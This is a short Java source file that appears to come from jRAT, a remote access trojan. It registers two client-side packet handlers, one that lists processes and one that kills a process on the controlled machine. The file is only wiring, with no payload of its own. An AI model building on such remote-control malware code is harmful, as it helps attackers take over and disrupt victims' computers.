package jrat.module.process;

import jrat.api.ClientModule;
import jrat.client.packets.incoming.IncomingPackets;

public class ProcessClientModule extends ClientModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 19, Packet19ListProcesses.class);
        IncomingPackets.register((short) 20, Packet20KillProcess.class);
    }
}
